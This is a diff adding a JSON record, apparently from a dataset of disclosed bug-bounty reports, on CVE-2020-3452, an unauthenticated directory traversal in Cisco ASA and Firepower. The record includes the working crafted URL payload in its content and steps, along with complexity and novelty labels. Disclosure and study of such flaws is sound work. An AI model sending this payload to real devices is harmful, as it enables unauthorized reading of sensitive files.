@@ -1,0 +1,38 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "amrr ",
+  "title": "CVE-2020-3452, unauthenticated file read in Cisco ASA & Cisco Firepower.",
+  "content": "\nSummary:\n#The affected IP:\n\u2588\u2588\u2588\u2588\u2588\nHere is POC of CVE-2020-3452, unauthenticated file read in Cisco ASA & Cisco Firepower.\nFor example to read \"/+CSCOE+/portal_inc.lua\" file.\nfor example:\n\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\nSuggested Mitigation/Remediation Actions\nCisco has released the fix https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86\nImpact\nThis vulnerability allows an unauthenticated, remote attacker to perform directory traversal attacks and read sensitive files on the system.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1599168180,
+  "report_url": "https://hackerone.com/reports/951508",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a crafted HTTP request to the vulnerable Cisco ASA or Firepower device with a directory traversal payload in the URL."
+    ],
+    [
+      2,
+      "The crafted URL should include the path traversal sequence to access sensitive files, such as '/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'."
+    ]
+  ],
+  "vuln_description": "This vulnerability allows an unauthenticated, remote attacker to perform directory traversal attacks and read sensitive files on the system by exploiting a flaw in the web services interface of Cisco ASA and Firepower devices.",
+  "reason": "The attack involves a straightforward directory traversal technique that does not require multiple components, complex state manipulation, or novel logic. The vulnerability is triggered by a single crafted HTTP request, making it relatively easy to discover and exploit.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
